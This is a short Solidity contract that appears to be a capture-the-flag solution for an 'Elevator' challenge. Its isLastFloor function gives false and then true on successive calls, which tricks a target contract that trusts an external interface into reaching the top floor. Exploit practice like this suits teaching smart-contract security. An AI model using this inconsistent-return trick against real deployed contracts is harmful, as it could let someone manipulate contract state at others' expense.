// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Elevator.sol';

contract ElevatorSolution is Building {
  bool public isFirstCall;
  Elevator public elevator;

  constructor(address _elevator) public {
    elevator = Elevator(_elevator);
    isFirstCall = true;
  }
  
  function isLastFloor(uint) external override returns (bool) {
    if (isFirstCall) {
      isFirstCall = false;
      return false;
    }
    return true;
  }

  function goTo(uint _floor) external {
    elevator.goTo(_floor);
  }
}